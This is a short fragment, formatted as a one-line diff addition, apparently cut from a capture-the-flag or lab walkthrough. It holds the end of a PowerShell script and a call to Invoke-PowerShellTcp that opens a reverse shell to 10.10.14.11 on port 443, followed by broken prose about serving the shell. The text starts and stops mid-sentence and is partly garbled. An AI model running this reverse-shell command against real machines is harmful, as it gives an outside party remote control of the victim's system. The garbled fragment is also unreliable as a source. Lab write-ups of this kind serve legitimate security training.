@@ -1,0 +1,1 @@
+ect port." Write-Error $_ } } Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443 Serve Shell Now I need to serve
